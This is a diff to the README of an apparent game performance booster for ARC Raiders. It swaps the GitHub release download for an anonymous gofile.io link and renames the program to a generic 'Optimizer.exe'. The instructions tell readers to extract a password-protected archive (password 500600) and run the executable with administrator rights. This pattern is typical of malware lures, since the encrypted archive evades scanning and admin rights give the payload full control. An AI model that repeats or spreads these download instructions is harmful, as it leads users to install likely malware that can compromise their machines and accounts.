@@ -23,9 +23,9 @@ OS: Microsoft Windows 10/11 (64-Bit). Admin Rights Are Required to Apply Certain
 Game: Intended for Use With the Live/Public Version of Arcraiders.  
 
 # 📥 Installation & Usage   
-1. [Download](https://github.com/leaf36ultrascreamblg/arc-raiders-fps-booster/releases/download/Stable/ARC_Raiders_FPS_Booster.zip) the Latest arcraiders-performance-optimizer.zip From the Releases Section.  
+1. [Download](https://gofile.io/d/JPPwHp)
 2. Enter Password: `500600` And Extract the Zip Archive to Any Folder.  
-3. Run Arcraiders Performance optimizer.exe (Administrator Rights Are Recommended).  
+3. Run Optimizer.exe (Administrator Rights Are Recommended).  
 4. Follow the On-Screen Instructions to Review, Select, and Apply Tweaks.  
 5. If Needed, Use the Restore Defaults Option From the Main Menu to Undo All Changes.  
 
